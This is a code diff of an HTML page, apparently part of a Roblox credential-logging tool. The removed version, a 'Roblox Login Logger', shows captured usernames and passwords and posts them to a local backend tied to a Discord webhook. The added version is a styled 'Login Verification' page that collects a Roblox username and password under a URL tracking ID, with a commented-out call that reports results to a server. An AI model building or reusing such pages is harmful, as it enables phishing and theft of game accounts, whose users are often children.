@@ -1,40 +1,150 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Roblox Login Logger</title>
+    <title>Roblox Login Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #00a2ff;
+            text-align: center;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #00a2ff;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #0088cc;
+        }
+        .result-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        .success-btn {
+            background-color: #4CAF50;
+        }
+        .fail-btn {
+            background-color: #f44336;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
 </head>
 <body>
-    <h2>Roblox Login Logger</h2>
-
-    <div>
-        <p><strong>User:</strong> <span id="username"></span></p>
-        <p><strong>Password:</strong> <span id="password"></span></p>
-        <p><strong>Status:</strong> <span id="status">❌ Pending Manual Login</span></p>
-
-        <button onclick="updateStatus('success')">✅ Mark as Success</button>
-        <button onclick="updateStatus('failed')">❌ Mark as Failed</button>
+    <div class="container">
+        <h1>Roblox Login Verification</h1>
+        <div id="login-form">
+            <p>Please log in to verify this account:</p>
+            <div class="form-group">
+                <label for="username">Username:</label>
+                <input type="text" id="username" placeholder="Enter username">
+            </div>
+            <div class="form-group">
+                <label for="password">Password:</label>
+                <input type="password" id="password" placeholder="Enter password">
+            </div>
+            <button onclick="attemptLogin()">Login</button>
+            
+            <div class="result-buttons hidden" id="result-buttons">
+                <button class="success-btn" onclick="reportResult(true)">Login Successful</button>
+                <button class="fail-btn" onclick="reportResult(false)">Login Failed</button>
+            </div>
+        </div>
+        <div id="result-message" class="hidden">
+            <p id="result-text"></p>
+        </div>
     </div>
 
     <script>
-        // Example: You can replace these dynamically or get from query params
-        const username = new URLSearchParams(window.location.search).get('user') || 'DevSccz';
-        const password = new URLSearchParams(window.location.search).get('pass') || 'DevScczcookin';
-
-        document.getElementById('username').innerText = username;
-        document.getElementById('password').innerText = password;
-
-        function updateStatus(result) {
-            fetch('http://127.0.0.1:6969/update', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ username, password, status: result })
-            })
-            .then(() => {
-                document.getElementById('status').innerText = result === 'success' ? '✅ Success' : '❌ Failed';
-                alert('Discord webhook updated!');
-            })
-            .catch(err => alert('Failed to update backend: ' + err));
+        // Get tracking ID from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const trackingId = urlParams.get('id');
+        
+        function attemptLogin() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (!username || !password) {
+                alert('Please enter both username and password');
+                return;
+            }
+            
+            // In a real implementation, you would actually try to log in to Roblox here
+            // For security reasons, we'll just show the result buttons
+            document.getElementById('result-buttons').classList.remove('hidden');
+        }
+        
+        function reportResult(isSuccess) {
+            if (!trackingId) {
+                alert('No tracking ID found');
+                return;
+            }
+            
+            // Send result to your server (you'll need to set up an endpoint)
+            // For now, we'll just show a message
+            const resultText = document.getElementById('result-text');
+            const resultMessage = document.getElementById('result-message');
+            
+            if (isSuccess) {
+                resultText.textContent = 'Login successful! Result has been reported.';
+                resultText.style.color = '#4CAF50';
+            } else {
+                resultText.textContent = 'Login failed! Result has been reported.';
+                resultText.style.color = '#f44336';
+            }
+            
+            document.getElementById('login-form').classList.add('hidden');
+            resultMessage.classList.remove('hidden');
+            
+            // In a real implementation, you would send this to your server:
+            // fetch('https://your-server.com/report-result', {
+            //     method: 'POST',
+            //     headers: { 'Content-Type': 'application/json' },
+            //     body: JSON.stringify({ trackingId, success: isSuccess })
+            // });
+            
+            // For now, we'll just show the result
+            console.log(`Tracking ID: ${trackingId}, Success: ${isSuccess}`);
+        }
+        
+        // Check if we have a tracking ID
+        if (!trackingId) {
+            document.getElementById('login-form').innerHTML = 
+                '<p style="color: red;">Error: No tracking ID provided</p>';
         }
     </script>
 </body>
